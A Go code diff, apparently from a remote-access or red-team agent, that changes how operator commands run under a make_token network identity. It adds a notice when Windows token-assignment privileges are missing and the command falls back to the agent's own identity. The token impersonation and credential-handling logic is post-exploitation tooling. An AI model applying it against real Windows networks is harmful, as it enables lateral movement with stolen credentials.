@@ -751,6 +751,15 @@ func buildCommandInvocation(command, goos string, pwshAvailable bool) (string, [
 	}
 }
 
+// degradedIdentityNotice explains a command that ran without the active
+// make_token identity: the agent account lacks the privilege Windows requires
+// to assign that token to a child, so the command kept the process identity
+// instead of failing to launch. Network commands need runas with explicit
+// credentials in that state.
+const degradedIdentityNotice = "[!] make_token identity not applied: this account lacks an enabled " +
+	"SeAssignPrimaryTokenPrivilege/SeImpersonatePrivilege, so the command ran under the agent identity " +
+	"with the process network credentials; use runas with explicit credentials for network commands."
+
 func runCommand(command string) (string, string) {
 	pwshAvailable := true
 	if runtime.GOOS == "windows" {
@@ -762,17 +771,27 @@ func runCommand(command string) (string, string) {
 		return err.Error(), "output"
 	}
 	// Operator commands created while a make_token identity is active run
-	// under that network identity (runas /netonly semantics).
+	// under that network identity (runas /netonly semantics) only when this
+	// process can assign the token to the child. Without the creation
+	// privilege, plain CreateProcess keeps the agent identity and the output
+	// below says so, because a blocked launch would block the command.
 	child := newCommand(name, args...)
-	applyCommandToken(child)
-	out, err := child.CombinedOutput()
+	identityApplied := applyCommandToken(child)
+	out, runErr := child.CombinedOutput()
 	// CreateProcessAsUserW may have reverted the creating thread's impersonation;
 	// restore it so subsequent operator commands stay authenticated.
 	reestablishThreadToken()
-	if err != nil {
-		return string(out) + "\n" + err.Error(), "output"
+	output := string(out)
+	if runErr != nil {
+		output += "\n" + runErr.Error()
 	}
-	return string(out), "output"
+	if !identityApplied && activeNetworkIdentity() != "" {
+		if output != "" {
+			output += "\n"
+		}
+		output += degradedIdentityNotice
+	}
+	return output, "output"
 }
 
 func downloadFile(path string) (string, string) {
